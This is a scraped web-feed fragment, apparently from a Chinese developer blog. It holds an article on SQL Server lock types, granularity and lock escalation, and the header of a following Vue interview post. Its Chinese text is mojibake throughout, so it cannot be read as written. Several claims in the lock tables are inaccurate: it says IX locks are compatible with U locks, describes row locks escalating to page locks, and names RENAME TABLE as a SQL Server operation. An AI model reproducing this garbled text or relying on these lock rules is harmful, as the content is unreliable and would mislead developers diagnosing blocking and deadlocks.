                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">SQL Server å®Œæ•´é”ç±»å‹è¯¦è§£</h2>
<p>ä½ æƒ³äº†è§£ SQL Server ä¸­çš„æ‰€æœ‰é”ç±»å‹ï¼ŒSQL Server çš„é”æŒ‰<strong>é”å®šèµ„æºç²’åº¦</strong>å’Œ<strong>é”çš„åŠŸèƒ½ç±»å‹</strong>å¯åˆ†ä¸ºä¸¤å¤§æ ¸å¿ƒåˆ†ç±»ï¼ŒåŒæ—¶æœ‰æ˜ç¡®çš„å…¼å®¹æ€§è§„åˆ™ï¼Œä¸‹é¢ä¸ºä½ é€ä¸€æ‹†è§£æ‰€æœ‰å…³é”®é”ç±»å‹ï¼š</p>
<h3 data-id="heading-1">ä¸€ã€ æŒ‰é”çš„åŠŸèƒ½ç±»å‹åˆ†ç±»ï¼ˆæ ¸å¿ƒä¸šåŠ¡ç›¸å…³é”ï¼‰</h3>
<p>è¿™æ˜¯æ—¥å¸¸å¼€å‘ã€æ’æŸ¥é”é˜»å¡æ—¶æœ€å¸¸æ¥è§¦çš„é”ç±»å‹ï¼ŒæŒ‰â€œå…±äº«/æ’ä»–/ç‰¹æ®ŠåŠŸèƒ½â€åˆ’åˆ†ï¼š</p>
<h4 data-id="heading-2">1. å…±äº«ç±»é”ï¼ˆå…è®¸å¤šä¼šè¯åŒæ—¶æŒæœ‰ï¼Œä¸ç›¸äº’é˜»å¡ï¼‰</h4>























<table><thead><tr><th>é”ç±»å‹æ ‡è¯†</th><th>é”åç§°</th><th>æ ¸å¿ƒç”¨é€”</th><th>å…³é”®ç‰¹æ€§</th></tr></thead><tbody><tr><td>S</td><td>å…±äº«é”ï¼ˆShared Lockï¼‰</td><td>ä¿æŠ¤æ•°æ®è¯»å–æ“ä½œï¼ˆå¦‚ <code>SELECT</code>ï¼‰ï¼Œé˜²æ­¢è¯»å–æœŸé—´æ•°æ®è¢«ä¿®æ”¹</td><td>1. å¤šä¸ªä¼šè¯å¯åŒæ—¶æŒæœ‰åŒä¸€èµ„æºçš„ <code>S</code> é” 2. ä¸ <code>X</code> é”ï¼ˆæ’ä»–é”ï¼‰ã€<code>U</code> é”ï¼ˆæ›´æ–°é”ï¼‰äº’æ–¥ 3. é˜»å¡å†™æ“ä½œï¼ˆ<code>INSERT/UPDATE/DELETE</code>ï¼‰ï¼Œä¸é˜»å¡è¯»æ“ä½œ 4. é»˜è®¤è¯»å®Œå³é‡Šæ”¾ï¼ˆäº‹åŠ¡å†…æŒæœ‰è‡³äº‹åŠ¡ç»“æŸï¼‰</td></tr><tr><td>Sch-S</td><td>æ¶æ„ç¨³å®šæ€§é”ï¼ˆSchema Stability Lockï¼‰</td><td>ä¿æŠ¤å¯¹è±¡æ¶æ„ï¼ˆè¡¨ã€è§†å›¾ç­‰ï¼‰ä¸è¢«ä¿®æ”¹ï¼Œç¡®ä¿è®¿é—®å¯¹è±¡æœŸé—´æ¶æ„ç¨³å®š</td><td>1. æ‰€æœ‰è®¿é—®å¯¹è±¡çš„æ“ä½œï¼ˆæ— è®ºè¯»å†™ï¼‰éƒ½ä¼šè‡ªåŠ¨æˆäºˆ 2. å¤šä¸ªä¼šè¯å¯åŒæ—¶æŒæœ‰ï¼Œä¸ <code>S/X/U</code> ç­‰æ•°æ®é”å…¼å®¹ 3. ä»…ä¸ <code>Sch-M</code> é”ï¼ˆæ¶æ„ä¿®æ”¹é”ï¼‰äº’æ–¥ 4. æ“ä½œå®Œæˆåç«‹å³é‡Šæ”¾ï¼Œå‡ ä¹æ— æ€§èƒ½å¼€é”€</td></tr></tbody></table>
<h4 data-id="heading-3">2. æ’ä»–ç±»é”ï¼ˆä»…å…è®¸å•ä¸ªä¼šè¯æŒæœ‰ï¼Œé˜»å¡æ‰€æœ‰å…¶ä»–é”ï¼‰</h4>























<table><thead><tr><th>é”ç±»å‹æ ‡è¯†</th><th>é”åç§°</th><th>æ ¸å¿ƒç”¨é€”</th><th>å…³é”®ç‰¹æ€§</th></tr></thead><tbody><tr><td>X</td><td>æ’ä»–é”ï¼ˆExclusive Lockï¼‰</td><td>ä¿æŠ¤æ•°æ®ä¿®æ”¹æ“ä½œï¼ˆ<code>INSERT/UPDATE/DELETE</code>ï¼‰ï¼Œé˜²æ­¢å¹¶å‘ä¿®æ”¹æ•°æ®</td><td>1. åŒä¸€èµ„æºä»…èƒ½è¢«ä¸€ä¸ªä¼šè¯æŒæœ‰ <code>X</code> é” 2. ä¸æ‰€æœ‰å…¶ä»–é”ï¼ˆ<code>S/U/Sch-S</code> ç­‰ï¼‰éƒ½äº’æ–¥ 3. é˜»å¡æ‰€æœ‰è¯»ã€å†™æ“ä½œï¼ŒæŒæœ‰è‡³äº‹åŠ¡æäº¤/å›æ»š 4. æ•°æ®ä¿®æ”¹æ—¶è‡ªåŠ¨æˆäºˆï¼Œæ— éœ€æ˜¾å¼æŒ‡å®š</td></tr><tr><td>Sch-M</td><td>æ¶æ„ä¿®æ”¹é”ï¼ˆSchema Modification Lockï¼‰</td><td>ä¿æŠ¤å¯¹è±¡æ¶æ„ä¿®æ”¹æ“ä½œï¼Œç¡®ä¿æ¶æ„ä¿®æ”¹æœŸé—´æ— å…¶ä»–ä¼šè¯è®¿é—®è¯¥å¯¹è±¡</td><td>1. æ‰§è¡Œ <code>ALTER TABLE/DROP TABLE/RENAME TABLE</code> ç­‰æ“ä½œæ—¶æˆäºˆ 2. æ’ä»–é”ï¼Œä¸æ‰€æœ‰é”ï¼ˆåŒ…æ‹¬ <code>Sch-S</code> é”ï¼‰äº’æ–¥ 3. é˜»å¡è¯¥å¯¹è±¡çš„æ‰€æœ‰è¯»å†™æ“ä½œï¼Œæ“ä½œå®Œæˆåé‡Šæ”¾ 4. ä¼˜å…ˆçº§æé«˜ï¼Œé€šå¸¸ä¼šç­‰å¾…ç°æœ‰é”é‡Šæ”¾åå†æˆäºˆ</td></tr></tbody></table>
<h4 data-id="heading-4">3. ç‰¹æ®ŠåŠŸèƒ½é”ï¼ˆä»‹äºå…±äº«ä¸æ’ä»–ä¹‹é—´ï¼Œè§£å†³ç‰¹å®šåœºæ™¯é—®é¢˜ï¼‰</h4>



























































<table><thead><tr><th>é”ç±»å‹æ ‡è¯†</th><th>é”åç§°</th><th>æ ¸å¿ƒç”¨é€”</th><th>å…³é”®ç‰¹æ€§</th></tr></thead><tbody><tr><td>U</td><td>æ›´æ–°é”ï¼ˆUpdate Lockï¼‰</td><td>ç”¨äºæ›´æ–°æ“ä½œçš„å‰æœŸé”å®šï¼ˆå…ˆæŸ¥åæ”¹åœºæ™¯ï¼‰ï¼Œé˜²æ­¢æ­»é”</td><td>1. æ‰§è¡Œ <code>UPDATE</code> æ—¶ï¼Œå…ˆå¯¹ç›®æ ‡èµ„æºæˆäºˆ <code>U</code> é”ï¼Œç¡®è®¤éœ€è¦ä¿®æ”¹åå‡çº§ä¸º <code>X</code> é” 2. åŒä¸€èµ„æºä»…èƒ½è¢«ä¸€ä¸ªä¼šè¯æŒæœ‰ <code>U</code> é”ï¼ˆäº’æ–¥ï¼‰ï¼Œä¸ <code>S</code> é”å…¼å®¹ï¼Œä¸ <code>X/U</code> é”äº’æ–¥ 3. é¿å…å¤šä¸ªä¼šè¯åŒæ—¶æŒæœ‰ <code>S</code> é”åå‡çº§ä¸º <code>X</code> é”å¯¼è‡´çš„æ­»é” 4. æŒæœ‰è‡³äº‹åŠ¡æäº¤/å›æ»šæˆ–å‡çº§ä¸º <code>X</code> é”</td></tr><tr><td>IX</td><td>æ„å‘æ’ä»–é”ï¼ˆIntent Exclusive Lockï¼‰</td><td>æ ‡è¯†ä¼šè¯<strong>æ„å‘</strong>å¯¹æŸä¸ªèµ„æºçš„ä¸‹çº§ç²’åº¦ï¼ˆå¦‚è¡¨â†’è¡Œï¼‰æŒæœ‰ <code>X</code> é”ï¼Œç”¨äºå¿«é€Ÿé”æ£€æµ‹</td><td>1. å¯¹ä¸‹çº§èµ„æºåŠ  <code>X</code> é”å‰ï¼Œå…ˆå¯¹ä¸Šçº§èµ„æºåŠ  <code>IX</code> é”ï¼ˆå¦‚æ›´æ–°æŸè¡Œå‰ï¼Œå…ˆå¯¹è¡¨åŠ  <code>IX</code> é”ï¼‰ 2. ä¸ <code>S/IS</code> é”äº’æ–¥ï¼Œä¸ <code>IX/U</code> ç­‰é”å…¼å®¹ 3. ä»…ç”¨äºé”å±‚çº§æ£€æµ‹ï¼Œä¸ç›´æ¥é˜»å¡æ•°æ®æ“ä½œ 4. è‡ªåŠ¨æˆäºˆï¼Œæ— éœ€æ˜¾å¼æ§åˆ¶</td></tr><tr><td>IS</td><td>æ„å‘å…±äº«é”ï¼ˆIntent Shared Lockï¼‰</td><td>æ ‡è¯†ä¼šè¯<strong>æ„å‘</strong>å¯¹æŸä¸ªèµ„æºçš„ä¸‹çº§ç²’åº¦æŒæœ‰ <code>S</code> é”ï¼Œç”¨äºå¿«é€Ÿé”æ£€æµ‹</td><td>1. å¯¹ä¸‹çº§èµ„æºåŠ  <code>S</code> é”å‰ï¼Œå…ˆå¯¹ä¸Šçº§èµ„æºåŠ  <code>IS</code> é”ï¼ˆå¦‚æŸ¥è¯¢æŸè¡Œå‰ï¼Œå…ˆå¯¹è¡¨åŠ  <code>IS</code> é”ï¼‰ 2. ä¸å¤§å¤šæ•°é”ï¼ˆ<code>S/IS/IX/U</code> ç­‰ï¼‰å…¼å®¹ï¼Œä»…ä¸ <code>X/Sch-M</code> é”äº’æ–¥ 3. æ— å®é™…é˜»å¡ä½œç”¨ï¼Œä»…ç”¨äºé”å±‚çº§æ ¡éªŒ 4. è‡ªåŠ¨æˆäºˆï¼Œæ“ä½œå®Œæˆåå¿«é€Ÿé‡Šæ”¾</td></tr><tr><td>IU</td><td>æ„å‘æ›´æ–°é”ï¼ˆIntent Update Lockï¼‰</td><td>æ ‡è¯†ä¼šè¯<strong>æ„å‘</strong>å¯¹æŸä¸ªèµ„æºçš„ä¸‹çº§ç²’åº¦æŒæœ‰ <code>U</code> é”ï¼Œæ˜¯ <code>U</code> é”çš„æ„å‘é”</td><td>1. å¯¹ä¸‹çº§èµ„æºåŠ  <code>U</code> é”å‰ï¼Œå…ˆå¯¹ä¸Šçº§èµ„æºåŠ  <code>IU</code> é” 2. å…¼å®¹æ€§ä¸ <code>IX</code> é”ç±»ä¼¼ï¼Œä¸ <code>S/IS</code> é”å…¼å®¹ï¼Œä¸ <code>X/Sch-M</code> é”äº’æ–¥ 3. ä»…ç”¨äºé”å±‚çº§ç®¡ç†ï¼Œæ—¥å¸¸åœºæ™¯ä¸­è¾ƒå°‘ç›´æ¥è§‚æµ‹åˆ°</td></tr><tr><td>BU</td><td>å¤§å®¹é‡æ›´æ–°é”ï¼ˆBulk Update Lockï¼‰</td><td>ç”¨äºå¤§å®¹é‡æ•°æ®åŠ è½½æ“ä½œï¼ˆå¦‚ <code>BULK INSERT</code>ï¼‰ï¼Œæé«˜æ‰¹é‡æ“ä½œæ€§èƒ½</td><td>1. ä»…åœ¨å¯ç”¨ <code>TABLOCK</code> æç¤ºæˆ–æ‰¹é‡åŠ è½½é€‰é¡¹æ—¶æˆäºˆ 2. åŒä¸€è¡¨å¯è¢«å¤šä¸ªä¼šè¯æŒæœ‰ <code>BU</code> é”ï¼ˆç›¸äº’å…¼å®¹ï¼‰ï¼Œä¸ <code>S</code> é”å…¼å®¹ï¼Œä¸ <code>X/Sch-M</code> é”äº’æ–¥ 3. é˜»å¡æ™®é€šå†™æ“ä½œï¼Œä¸é˜»å¡æ‰¹é‡åŠ è½½æ“ä½œå’Œè¯»æ“ä½œ 4. å¤§å¹…æå‡å¤§å®¹é‡æ•°æ®æ’å…¥çš„æ€§èƒ½ï¼Œå‡å°‘é”ç«äº‰</td></tr><tr><td>RangeS-S</td><td>èŒƒå›´å…±äº«-å…±äº«é”ï¼ˆé”®èŒƒå›´é”ï¼‰</td><td>ç”¨äºå¯åºåˆ—åŒ–éš”ç¦»çº§åˆ«ä¸‹çš„èŒƒå›´æŸ¥è¯¢ï¼Œé˜²æ­¢å¹»è¯»</td><td>1. é”å®šæŸ¥è¯¢ç»“æœçš„é”®èŒƒå›´åŠå¯¹åº”æ•°æ®ï¼Œé˜²æ­¢å…¶ä»–ä¼šè¯æ’å…¥/ä¿®æ”¹è¯¥èŒƒå›´å†…çš„æ•°æ® 2. å…±äº«é”ç‰¹æ€§ï¼Œå¤šä¸ªä¼šè¯å¯åŒæ—¶æŒæœ‰ï¼Œä¸ <code>X</code> é”äº’æ–¥ 3. ä»…åœ¨å¯åºåˆ—åŒ–éš”ç¦»çº§åˆ«ä¸‹ç”Ÿæ•ˆï¼Œæ˜¯é˜²æ­¢å¹»è¯»çš„æ ¸å¿ƒé” 4. æŒæœ‰è‡³äº‹åŠ¡ç»“æŸ</td></tr><tr><td>RangeS-U</td><td>èŒƒå›´å…±äº«-æ›´æ–°é”ï¼ˆé”®èŒƒå›´é”ï¼‰</td><td>ç”¨äºå¯åºåˆ—åŒ–éš”ç¦»çº§åˆ«ä¸‹çš„èŒƒå›´æ›´æ–°æŸ¥è¯¢å‰æœŸé”å®š</td><td>1. ä»‹äº <code>RangeS-S</code> å’Œ <code>RangeX-X</code> ä¹‹é—´ï¼Œå…ˆé”å®šèŒƒå›´ï¼Œå†å‡çº§ä¸ºæ›´æ–°é” 2. äº’æ–¥æ€§ä¸ <code>U</code> é”ç±»ä¼¼ï¼Œé˜²æ­¢å¹¶å‘èŒƒå›´æ›´æ–°å¯¼è‡´çš„æ­»é” 3. ä»…åœ¨å¯åºåˆ—åŒ–éš”ç¦»çº§åˆ«ä¸‹ç”Ÿæ•ˆ</td></tr><tr><td>RangeX-X</td><td>èŒƒå›´æ’ä»–-æ’ä»–é”ï¼ˆé”®èŒƒå›´é”ï¼‰</td><td>ç”¨äºå¯åºåˆ—åŒ–éš”ç¦»çº§åˆ«ä¸‹çš„èŒƒå›´æ•°æ®ä¿®æ”¹ï¼Œé˜²æ­¢èŒƒå›´æ•°æ®è¢«ç¯¡æ”¹</td><td>1. æ’ä»–æ€§é”ï¼Œé”å®šé”®èŒƒå›´åŠæ•°æ®ï¼Œé˜»å¡æ‰€æœ‰å¯¹è¯¥èŒƒå›´çš„è¯»å†™æ“ä½œ 2. ä¸æ‰€æœ‰é”®èŒƒå›´é”å’Œæ•°æ®é”äº’æ–¥ï¼ŒæŒæœ‰è‡³äº‹åŠ¡ç»“æŸ 3. å¯åºåˆ—åŒ–éš”ç¦»çº§åˆ«ä¸‹ä¿®æ”¹èŒƒå›´æ•°æ®æ—¶è‡ªåŠ¨æˆäºˆ</td></tr></tbody></table>
<h3 data-id="heading-5">äºŒã€ æŒ‰é”å®šèµ„æºç²’åº¦åˆ†ç±»ï¼ˆé”çš„ä½œç”¨èŒƒå›´ï¼‰</h3>
<p>SQL Server æ”¯æŒâ€œé”å‡çº§â€æœºåˆ¶ï¼ˆä»ç»†ç²’åº¦é”å‡çº§ä¸ºç²—ç²’åº¦é”ï¼Œå‡å°‘é”èµ„æºå¼€é”€ï¼‰ï¼ŒæŒ‰ç²’åº¦ä»ç»†åˆ°ç²—åˆ†ä¸ºï¼š</p>
<ol start="0">
<li>
<p><strong>è¡Œçº§é”ï¼ˆRow Lockï¼‰</strong></p>
<ul>
<li>æœ€ç»†ç²’åº¦çš„é”ï¼Œé”å®šè¡¨ä¸­çš„å•æ¡æˆ–å¤šæ¡è®°å½•ï¼ˆé€šè¿‡ä¸»é”®/ç´¢å¼•å®šä½ï¼‰</li>
<li>ä¼˜ç‚¹ï¼šé”ç«äº‰æœ€å°ï¼Œå¹¶å‘æ€§èƒ½æœ€é«˜ï¼›ç¼ºç‚¹ï¼šé”æ•°é‡è¿‡å¤šæ—¶ï¼Œæ¶ˆè€—å†…å­˜èµ„æº</li>
<li>å¯¹åº”é”ç±»å‹ï¼š<code>S/X/U</code> ç­‰ï¼Œæ—¥å¸¸ <code>SELECT/UPDATE</code> ä¼˜å…ˆä½¿ç”¨è¡Œçº§é”</li>
</ul>
</li>
<li>
<p><strong>é¡µçº§é”ï¼ˆPage Lockï¼‰</strong></p>
<ul>
<li>é”å®šæ•°æ®é¡µï¼ˆSQL Server ä¸­ä¸€é¡µé»˜è®¤8KBï¼‰ï¼ŒåŒ…å«å¤šæ¡è¡Œè®°å½•</li>
<li>ä¼˜ç‚¹ï¼šé”æ•°é‡å°‘äºè¡Œçº§é”ï¼Œå†…å­˜å¼€é”€å°ï¼›ç¼ºç‚¹ï¼šé”ç«äº‰æ¯”è¡Œçº§é”é«˜ï¼ˆé”å®šä¸€é¡µå³é”å®šæ‰€æœ‰è¡Œï¼‰</li>
<li>å¯¹åº”é”ç±»å‹ï¼š<code>S/X/U</code> ç­‰ï¼Œå½“è¡Œçº§é”æ•°é‡è¿‡å¤šæ—¶ï¼Œä¼šå‡çº§ä¸ºé¡µçº§é”</li>
</ul>
</li>
<li>
<p><strong>è¡¨çº§é”ï¼ˆTable Lockï¼‰</strong></p>
<ul>
<li>é”å®šæ•´ä¸ªæ•°æ®è¡¨ï¼Œç²’åº¦æœ€ç²—</li>
<li>ä¼˜ç‚¹ï¼šé”ç®¡ç†å¼€é”€æœ€å°ï¼Œæ— éœ€ç»´æŠ¤å¤§é‡ç»†ç²’åº¦é”ï¼›ç¼ºç‚¹ï¼šé”ç«äº‰æœ€å¤§ï¼Œå¹¶å‘æ€§èƒ½æœ€ä½</li>
<li>å¯¹åº”é”ç±»å‹ï¼š<code>S/X/Sch-S/Sch-M/IX/IS</code> ç­‰ï¼Œé”å‡çº§çš„æœ€ç»ˆçº§åˆ«ï¼ˆé»˜è®¤è¡Œçº§é”æ•°é‡è¶…è¿‡5000æ—¶å‡çº§ä¸ºè¡¨çº§é”ï¼‰</li>
</ul>
</li>
<li>
<p><strong>å…¶ä»–ç²’åº¦é”ï¼ˆè¾ƒå°‘è§ï¼‰</strong></p>
<ul>
<li><strong>æ•°æ®åº“é”</strong>ï¼šé”å®šæ•´ä¸ªæ•°æ®åº“ï¼ˆå¦‚ <code>ALTER DATABASE</code> æ“ä½œï¼‰ï¼Œæ ‡è¯†ä¸º <code>D</code></li>
<li><strong>æ–‡ä»¶é”</strong>ï¼šé”å®šæ•°æ®åº“æ–‡ä»¶ï¼Œæ ‡è¯†ä¸º <code>F</code></li>
<li><strong>ç´¢å¼•é”</strong>ï¼šé”å®šç´¢å¼•é¡µæˆ–ç´¢å¼•é”®ï¼Œæ ‡è¯†ä¸º <code>I</code></li>
<li><strong>å…ƒæ•°æ®é”</strong>ï¼šé”å®šç³»ç»Ÿå…ƒæ•°æ®ï¼ˆå¦‚ç³»ç»Ÿè§†å›¾ï¼‰ï¼Œæ ‡è¯†ä¸º <code>M</code></li>
</ul>
</li>
</ol>
<h3 data-id="heading-6">ä¸‰ã€ æ ¸å¿ƒè¡¥å……ï¼šé”çš„å…¼å®¹æ€§ä¸é”å‡çº§</h3>
<h4 data-id="heading-7">1. æ ¸å¿ƒå…¼å®¹æ€§è§„åˆ™ï¼ˆå…³é”®ï¼‰</h4>
<ul>
<li>å…±äº«ç±»é”ï¼ˆ<code>S/Sch-S/IS</code>ï¼‰ä¹‹é—´ç›¸äº’å…¼å®¹ï¼Œå¯åŒæ—¶æŒæœ‰</li>
<li>æ’ä»–ç±»é”ï¼ˆ<code>X/Sch-M</code>ï¼‰ä¸æ‰€æœ‰å…¶ä»–é”éƒ½äº’æ–¥ï¼Œä»…èƒ½å•ç‹¬æŒæœ‰</li>
<li>æ„å‘é”ï¼ˆ<code>IX/IS/IU</code>ï¼‰ä»…ä¸æ’ä»–ç±»é”äº’æ–¥ï¼Œä¸å…±äº«ç±»é”ã€å…¶ä»–æ„å‘é”å…¼å®¹</li>
<li>æ›´æ–°é”ï¼ˆ<code>U</code>ï¼‰ä»…ä¸ <code>S/IS</code> é”å…¼å®¹ï¼Œä¸ <code>X/U/IX</code> ç­‰é”äº’æ–¥</li>
</ul>
<h4 data-id="heading-8">2. é”å‡çº§æœºåˆ¶</h4>
<ul>
<li>è§¦å‘æ¡ä»¶ï¼šå½“å•ä¸ªä¼šè¯å¯¹æŸè¡¨çš„è¡Œçº§é”/é¡µçº§é”æ•°é‡è¶…è¿‡é˜ˆå€¼ï¼ˆé»˜è®¤5000ä¸ªé”ï¼‰ï¼Œæˆ–é”èµ„æºæ¶ˆè€—è¿‡å¤šæ—¶ï¼ŒSQL Server ä¼šè‡ªåŠ¨å°†ç»†ç²’åº¦é”å‡çº§ä¸ºè¡¨çº§é”</li>
<li>ç›®çš„ï¼šå‡å°‘é”çš„ç»´æŠ¤å¼€é”€ï¼Œé™ä½å†…å­˜å ç”¨</li>
<li>æ§åˆ¶æ–¹å¼ï¼šå¯é€šè¿‡ <code>ALTER TABLE è¡¨å SET LOCK_ESCALATION = {AUTO | TABLE | DISABLE}</code> è°ƒæ•´é”å‡çº§ç­–ç•¥</li>
</ul>
<h3 data-id="heading-9">æ€»ç»“</h3>
<ol start="0">
<li>æ ¸å¿ƒåŠŸèƒ½é”ï¼š<code>S</code>ï¼ˆè¯»é”ï¼‰ã€<code>X</code>ï¼ˆå†™é”ï¼‰ã€<code>Sch-S</code>ï¼ˆæ¶æ„ç¨³å®šï¼‰ã€<code>Sch-M</code>ï¼ˆæ¶æ„ä¿®æ”¹ï¼‰ã€<code>U</code>ï¼ˆæ›´æ–°ï¼‰æ˜¯æ—¥å¸¸æ’æŸ¥çš„é‡ç‚¹ï¼›</li>
<li>æ„å‘é”ï¼ˆ<code>IX/IS</code>ï¼‰ï¼šç”¨äºé”å±‚çº§æ£€æµ‹ï¼Œæ— ç›´æ¥ä¸šåŠ¡å½±å“ï¼›</li>
<li>é”®èŒƒå›´é”ï¼ˆ<code>RangeS-S/RangeX-X</code>ï¼‰ï¼šä»…åœ¨å¯åºåˆ—åŒ–éš”ç¦»çº§åˆ«ä¸‹ç”Ÿæ•ˆï¼Œé˜²æ­¢å¹»è¯»ï¼›</li>
<li>ç²’åº¦åˆ†ç±»ï¼šè¡Œçº§ï¼ˆé«˜å¹¶å‘ï¼‰â†’ é¡µçº§ â†’ è¡¨çº§ï¼ˆä½å¹¶å‘ï¼‰ï¼Œæ”¯æŒè‡ªåŠ¨é”å‡çº§ï¼›</li>
<li>æ ¸å¿ƒè§„åˆ™ï¼šå…±äº«é”å…¼å®¹ã€æ’ä»–é”äº’æ–¥ã€æ„å‘é”ç”¨äºå¿«é€Ÿæ£€æµ‹ã€‚</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[é¢è¯•å®˜ : â€ è¯´ä¸€ä¸‹ Vue ä¸­çš„ setup ä¸­çš„ props å’Œ context â€œ]]></title>    <link>https://juejin.cn/post/7590159073988706356</link>    <guid>https://juejin.cn/post/7590159073988706356</guid>    <pubDate>2026-01-02T11:53:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590159073988706356" data-draft-id="7590128405350596608" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="é¢è¯•å®˜ : â€ è¯´ä¸€ä¸‹ Vue ä¸­çš„ setup ä¸­çš„ props å’Œ context â€œ"/> <meta itemprop="keywords" content="å‰ç«¯,Vue.js,é¢è¯•"/> <meta itemprop="datePublished" content="2026-01-02T11:53:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åƒå¯»girling"/> <meta itemprop="url" content="https://juejin.cn/user/2276467567770442"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            é¢è¯•å®˜ : â€ è¯´ä¸€ä¸‹ Vue ä¸­çš„ setup ä¸­çš„ props å’Œ context â€œ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2276467567770442/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    åƒå¯»girling
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T11:53:28.000Z" title="Fri Jan 02 2026 11:53:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
